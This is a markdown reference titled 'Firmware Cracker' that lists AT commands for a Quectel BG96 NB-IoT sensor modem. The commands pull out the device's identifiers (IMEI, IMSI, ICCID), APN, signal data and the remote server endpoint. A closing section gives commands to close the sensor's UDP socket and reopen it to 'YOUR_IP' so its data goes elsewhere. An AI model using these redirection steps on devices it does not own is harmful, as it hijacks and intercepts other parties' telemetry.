# 🎯 FIRMWARE CRACKER - INTELLIGENCE TARGETS

## What Will Be Extracted

### 🔴 CRITICAL - Server Configuration

```
Command: AT+CIPOPEN?
Expected Output: +CIPOPEN: 0,"UDP","103.xxx.xxx.xxx",5000

EXTRACTS:
✓ Protocol Type: UDP
✓ Remote Server IP: 103.xxx.xxx.xxx  ← WHERE DATA GOES
✓ Remote Port: 5000                   ← WHICH PORT
✓ Connection ID: 0
```

```
Command: AT+CIPSTATUS
Expected Output: Connection status with endpoints

EXTRACTS:
✓ All active connections
✓ Connection states
✓ Remote endpoints
```

```
Command: AT+CGPADDR
Expected Output: +CGPADDR: 1,"10.123.45.67"

EXTRACTS:
✓ Local IP Address: 10.123.45.67  ← SENSOR'S CELLULAR IP
```

---

### 🆔 Device Identity

```
Command: AT+CGSN
Output: 351469520687041

EXTRACTS:
✓ IMEI: 351469520687041
```

```
Command: AT+CIMI
Output: 502153012345678

EXTRACTS:
✓ IMSI: 502153012345678  ← SIM IDENTITY
```

```
Command: AT+CCID / AT+ICCID
Output: 89601234567890123456

EXTRACTS:
✓ ICCID: 89601234567890123456  ← SIM CARD ID
```

```
Command: AT+CGMR
Output: BG96MAR02A07M1G

EXTRACTS:
✓ Firmware Version: BG96MAR02A07M1G
```

---

### 📡 Network Configuration

```
Command: AT+CEREG?
Output: +CEREG: 0,1

EXTRACTS:
✓ Network Registration Status
✓ Home/Roaming indicator
```

```
Command: AT+COPS?
Output: +COPS: 0,0,"Maxis",9

EXTRACTS:
✓ Network Operator: Maxis
✓ Network Type: NB-IoT (9)
```

```
Command: AT+CGDCONT?
Output: +CGDCONT: 1,"IP","m2mxnbiot","0.0.0.0",0,0

EXTRACTS:
✓ APN: m2mxnbiot  ← NETWORK ACCESS POINT
✓ PDP Type: IP
✓ Context ID: 1
```

---

### 📶 Signal Quality

```
Command: AT+CSQ
Output: +CSQ: 25,99

EXTRACTS:
✓ Signal Strength: 25 (out of 31)
```

```
Command: AT+QCBCINFOSC
Output: earfcn,pci,-85,8,...

EXTRACTS:
✓ RSRP: -85 dBm  ← SIGNAL POWER
✓ SNR: 8 dB      ← SIGNAL QUALITY
✓ Cell ID
✓ Frequency
```

---

### ⚡ Power Management

```
Command: AT+QCSLEEP?
Output: +QCSLEEP: HIB2

EXTRACTS:
✓ Sleep Mode: HIB2 (Hibernate Level 2)
```

```
Command: AT+CPSMS?
Output: +CPSMS: 1,,,,"00000100","00000001"

EXTRACTS:
✓ Power Saving Mode: Enabled
✓ TAU Timer
✓ Active Timer
```

---

## 🎯 PRIMARY TARGETS FOR SERVER REDIRECTION

### What You Need to Redirect Data to Your Server:

1. **Current Remote IP** ← From `AT+CIPOPEN?`
2. **Current Remote Port** ← From `AT+CIPOPEN?`
3. **Protocol Type** ← From `AT+CIPOPEN?` (UDP/TCP)
4. **Connection ID** ← From `AT+CIPOPEN?`

### Then You Can:

```python
# Close current connection
AT+CIPCLOSE=0

# Open to YOUR server
AT+CIPOPEN=0,"UDP","YOUR_IP",YOUR_PORT

# Verify
AT+CIPOPEN?
# Should show: +CIPOPEN: 0,"UDP","YOUR_IP",YOUR_PORT
```

---

## 📊 Expected Intelligence Report Structure

```json
{
  "scan_time": "2026-02-13T12:45:00",
  
  "device_identity": {
    "imei": "351469520687041",
    "imsi": "502153012345678",
    "iccid": "89601234567890123456",
    "manufacturer": "Quectel",
    "model": "BG96",
    "firmware_version": "BG96MAR02A07M1G"
  },
  
  "network_endpoints": {
    "local_ip": "10.123.45.67",
    "remote_servers": [
      "103.xxx.xxx.xxx"
    ],
    "udp_connections": [
      {
        "raw": "+CIPOPEN: 0,\"UDP\",\"103.xxx.xxx.xxx\",5000",
        "ips": ["103.xxx.xxx.xxx"],
        "ports": ["5000"]
      }
    ],
    "tcp_connections": [],
    "pdp_contexts": [
      "+CGDCONT: 1,\"IP\",\"m2mxnbiot\",\"0.0.0.0\",0,0"
    ]
  },
  
  "raw_responses": {
    "identity": { ... },
    "network": { ... },
    "socket_config": { ... }
  }
}
```

---

## 🚀 Quick Reference: Key Commands

| Command | What It Reveals | Priority |
|---------|----------------|----------|
| `AT+CIPOPEN?` | **Remote server IP & port** | 🔴 CRITICAL |
| `AT+CIPSTATUS` | Connection status | 🔴 CRITICAL |
| `AT+CGPADDR` | Local IP address | 🟡 HIGH |
| `AT+CGSN` | IMEI | 🟡 HIGH |
| `AT+CIMI` | IMSI | 🟡 HIGH |
| `AT+CGDCONT?` | APN configuration | 🟡 HIGH |
| `AT+CGMR` | Firmware version | 🟢 MEDIUM |
| `AT+QCBCINFOSC` | Signal quality (RSRP/SNR) | 🟢 MEDIUM |
| `AT+CEREG?` | Network registration | 🟢 MEDIUM |

---

## 💡 What This Enables

### ✅ Server Redirection
- Know exactly where data is going
- Redirect to your own server
- Monitor data in real-time

### ✅ Network Analysis
- Understand cellular connectivity
- Optimize data transmission
- Troubleshoot connection issues

### ✅ Device Management
- Track device identity
- Monitor firmware versions
- Manage SIM cards

### ✅ Custom Firmware Development
- Know exact AT command set
- Understand device capabilities
- Build compatible firmware

---

**🔓 Knowledge is Power - Extract Everything!**
